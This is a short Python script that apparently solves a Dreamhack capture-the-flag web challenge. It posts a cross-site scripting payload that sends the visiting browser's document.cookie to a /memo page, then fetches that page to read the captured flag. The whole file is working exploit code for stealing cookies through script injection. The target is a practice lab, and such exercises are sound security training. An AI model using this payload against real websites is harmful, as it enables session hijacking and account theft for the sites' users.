import requests

HOST = "http://host3.dreamhack.games"
PORT = "20755"
ATTACK_URI = "/flag"
PAYLOAD = "<script>location.href='/memo?memo='+document.cookie;</script>"
POST_DATA = {"param" : PAYLOAD}
GET_FLAG = "/memo"

URL = HOST + ":" + PORT + ATTACK_URI

resp = requests.post(URL, data=POST_DATA)

URL = HOST + ":" + PORT + GET_FLAG

resp = requests.get(URL)
print(resp.text)